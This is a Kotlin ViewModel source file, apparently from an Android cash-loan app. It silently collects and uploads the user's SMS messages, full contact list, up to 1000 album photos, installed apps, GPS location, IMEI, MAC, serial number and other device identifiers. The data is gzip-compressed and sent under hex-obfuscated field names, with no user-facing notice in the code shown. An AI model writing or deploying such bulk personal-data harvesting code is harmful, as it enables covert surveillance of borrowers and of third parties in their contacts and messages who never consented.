package com.kredit.cash.loan.app.common.vm

import com.blankj.utilcode.util.GsonUtils
import com.blankj.utilcode.util.LogUtils
import com.blankj.utilcode.util.Utils
import com.didichuxing.doraemonkit.util.LocationUtils
import com.kredit.cash.loan.app.bean.*
import com.kredit.cash.loan.app.common.Constant
import com.kredit.cash.loan.app.common.UserManager
import com.kredit.cash.loan.app.net.Api
import com.tcl.base.common.BaseViewModel
import com.tcl.base.event.SingleLiveEvent
import com.tcl.base.kt.GZIPCompress
import com.tcl.base.kt.nullToEmpty
import com.tcl.base.utils.MmkvUtil

/**
 *@author tiaozi
 *@date   2022/1/26
 *description
 */
open class DeviceInfoViewModel : BaseViewModel() {
    val upDeviceInfo = SingleLiveEvent<Boolean>()

    /**
     *判断客户是否完成设备信息上传(详细信息)
     */
    fun hadUploadDeviceInfoDetails() {
        rxLaunchUI({
            val result = Api.hadUploadDeviceInfoDetails()
            LogUtils.dTag("deviceParam", "isUpload = " + result.`9C9590A184989B9590`)
            if (!result.`9C9590A184989B9590`) {
                LogUtils.dTag(
                    "deviceParam",
                    "uploadStatus = " + GsonUtils.toJson(result.`9091829D9791A08D8491BD80919987`)
                )
                result.`9091829D9791A08D8491BD80919987`?.forEach {
                    if (it == 10) {
                        uploadDeviceBaseInfo()
                    }
                    if (it == 20) {
                        uploadDeviceAppInfo()
                    }
                    if (it == 30) {
                        uploadDeviceSmsInfo()
                    }
                    if (it == 40) {
                        uploadDeviceContactsInfo()
                    }
                    if (it == 60) {
                        upDevicePhoto()
                    }
                }
            }
        })
    }

    fun updateDeviceInfo() {
        if (!UserManager.isFalseAccount() && UserManager.isLogin()) {
            hadUploadDeviceInfoDetails()
        }
    }

    /**
     * 上传设备信息 （相册信息）
     */
    fun upDevicePhoto() {
        rxLaunchUI({
            val files = com.kredit.cash.loan.app.utils.DeviceUtils.getLocalAlbumList(0, 1000)
            val paramStr = GsonUtils.toJson(files)
            LogUtils.dTag("deviceParam", "uploadDeviceAlbumInfo ->$paramStr")
            val paramBean =
                DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086` = paramStr.GZIPCompress())
            val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
            upDeviceInfo.postValue(result.`869187819880`)
        }, showToast = false)
    }

    /**
     * 上传设备信息 （位置信息）
     */
    fun uploadDeviceLocation() {
        rxLaunchUI({
            val curLatitude = MmkvUtil.decodeDouble("curLatitude") ?: 0.0
            val curLongitude = MmkvUtil.decodeDouble("curLongitude") ?: 0.0
            val address = LocationUtils.getAddress(curLatitude, curLongitude)
            var area = address.subLocality
            if (area.isNullOrEmpty()) {
                area = address.subAdminArea + address.thoroughfare
            }
            val paramBean = DeviceLocationParamBean(
                LocationBean(
                    `938487` = GpsBean(curLatitude, curLongitude),
                    `938487B5909086918787A4869B829D9A9791` = address?.adminArea.nullToEmpty(),
                    `938487B5909086918787B79D808D` = address?.locality.nullToEmpty(),
                    `938487B5909086918787B895869391B09D8780869D9780` = area
                )
            )
            val paramStr = GsonUtils.toJson(paramBean)
            LogUtils.dTag("deviceParam", "uploadDeviceLocation ->$paramStr")
            val result = Api.uploadDeviceLocation(paramStr)
            upDeviceInfo.postValue(result.`869187819880`)
        }, showToast = false)
    }

    /**
     * 上传设备信息(短信信息)，注意：此接口的参数值需要进行压缩，所以不需要进行全body加密
     */
    fun uploadDeviceSmsInfo() {
        rxLaunchUI({
            val paramStr = GsonUtils.toJson(com.kredit.cash.loan.app.utils.DeviceUtils.getSmsInPhone())
            LogUtils.dTag("deviceParam", "uploadDeviceSmsInfo ->$paramStr")
            val paramBean = DeviceSMSParamBean(paramStr.GZIPCompress())
            val result = Api.uploadDeviceSmsInfo(GsonUtils.toJson(paramBean))
            upDeviceInfo.postValue(result.`869187819880`)
        }, showToast = false)
    }

    /**
     * 上传设备信息(联系人信息)，注意：此接口的参数值需要进行压缩，所以不需要进行全body加密
     */
    fun uploadDeviceContactsInfo() {
        rxLaunchUI({
            val paramStr = GsonUtils.toJson(com.kredit.cash.loan.app.utils.DeviceUtils.getContacts())
            LogUtils.dTag("deviceParam", "uploadDeviceContactsInfo ->$paramStr")
            val paramBean = DeviceContactsParamBean(paramStr.GZIPCompress())
            val result = Api.uploadDeviceContactsInfo(GsonUtils.toJson(paramBean))
            upDeviceInfo.postValue(result.`869187819880`)
        }, showToast = false)
    }

    /**
     * 上传设备信息(app列表信息)，注意：此接口的参数值需要进行压缩，所以不需要进行全body加密
     */
    fun uploadDeviceAppInfo() {
        rxLaunchUI({
            val paramStr = GsonUtils.toJson(com.kredit.cash.loan.app.utils.DeviceUtils.getAllAppInfo())
            LogUtils.dTag("deviceParam", "uploadDeviceContactsInfo ->$paramStr")
            val paramBean = DeviceAppsParamBean(paramStr.GZIPCompress())
            val result = Api.uploadDeviceAppInfo(GsonUtils.toJson(paramBean))
            upDeviceInfo.postValue(result.`869187819880`)
        }, showToast = false)
    }

    fun getIpAddress() {
        rxLaunchUI({
            val result = Api.getIpAddress()
            MmkvUtil.encode(Constant.IPADDRESS, result)
        }, showToast = false)
    }

    /**
     * 上传设备信息(基础信息，必须获取的字段已标注)
     */
    fun uploadDeviceBaseInfo() {
        Thread {
            val gaid = com.kredit.cash.loan.app.utils.DeviceUtils.getGAID()//需异步请求
            rxLaunchUI({
                val batteryPct = MmkvUtil.decodeString("batteryPct")
                val curLatitude = MmkvUtil.decodeDouble("curLatitude") ?: 0.0
                val curLongitude = MmkvUtil.decodeDouble("curLongitude") ?: 0.0
                val address = LocationUtils.getAddress(curLatitude, curLongitude)
                var area = address.subLocality
                if (area.isNullOrEmpty()) {
                    area = address.subAdminArea + address.thoroughfare
                }
                LogUtils.dTag("gaid", gaid)
                val paramBean = DeviceBaseInfoBean(
                    `9695808091868DA78095808187` = BatteryStatusBean(batteryPct),
                    `9091829D9791B29D9891B79A80` = DeviceFileCnt(
                        `9581909D9BB18C8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readExternalMusicNum(),
                        `9581909D9BBD9A8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readInternalMusicNum(),
                        `909B839A989B9590B29D989187` = com.kredit.cash.loan.app.utils.DeviceUtils.readInternalVideoNum(),
                        `9D9995939187B18C8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readExternalImgNum(),
                        `9D9995939187BD9A8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readDownloadNum(),
                        `829D90919BB18C8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readExternalVideoNum(),
                        `829D90919BBD9A8091869A9598` = com.kredit.cash.loan.app.utils.DeviceUtils.readInternalImgNum()
                    ),
                    `93919A91869598B0958095` = GeneralData(
                        `959A90BD90` = com.kredit.cash.loan.app.utils.DeviceUtils.getAndroidId(),
                        `909699` = com.kredit.cash.loan.app.utils.DeviceUtils.getMobileDbm(),
                        `9091829D9791BD90` = com.kredit.cash.loan.app.utils.DeviceUtils.getDeviceId(),
                        `91989584879190A6919598809D9991` = com.kredit.cash.loan.app.utils.DeviceUtils.getSystemStartupTime(),
                        `9395BD90` = gaid,
                        `9D99919D` = com.kredit.cash.loan.app.utils.DeviceUtils.getIMEI(),
                        `999597` = com.kredit.cash.loan.app.utils.DeviceUtils.getMac()
                    ),
                    `9C95869083958691` = HardwareBean(
                        `9686959A90` = com.kredit.cash.loan.app.utils.DeviceUtils.getDeviceBrand(),
                        `8791869D9598BA8199969186` = com.kredit.cash.loan.app.utils.DeviceUtils.getSERIAL()
                    ),
                    `989B9795809D9B9A` = LocationBean(
                        `938487` = GpsBean(curLatitude, curLongitude),
                        `938487B5909086918787A4869B829D9A9791` = address?.adminArea.nullToEmpty(),
                        `938487B5909086918787B79D808D` = address?.locality.nullToEmpty(),
                        `938487B5909086918787B895869391B09D8780869D9780` = area
                    ),
                    `9A9180839B869F` = WifiConnectBean(com.kredit.cash.loan.app.utils.DeviceUtils.getAroundWifiNum()),
                    `87809B86959391` = StorageBean(
                        `918C8091869A9598A7809B86959391` = Utils.getApp().externalCacheDir?.absolutePath,
                        `9991999B868DB7958690A79D8E91` = com.kredit.cash.loan.app.utils.DeviceUtils.getSDTotalSize(),
                        `9991999B868DB7958690A79D8E91A18791` = com.kredit.cash.loan.app.utils.DeviceUtils.getSDTotalSize() - com.kredit.cash.loan.app.utils.DeviceUtils.getSdAvaliableSize(),
                        `869599A09B809598A79D8E91` = com.kredit.cash.loan.app.utils.DeviceUtils.getRomTotalSize(),
                        `869599A18795969891A79D8E91` = com.kredit.cash.loan.app.utils.DeviceUtils.getRomAvailableSize()
                    ),
                )
                val paramStr = GsonUtils.toJson(paramBean)
                LogUtils.dTag("deviceParam", "uploadDeviceBaseInfo ->$paramStr")
                val result = Api.uploadDeviceBaseInfo(
                    GsonUtils.toJson(DeviceBaseParamBean(paramStr.GZIPCompress()))
                )
                upDeviceInfo.postValue(result.`869187819880`)
            }, showToast = false)
        }.start()
    }
}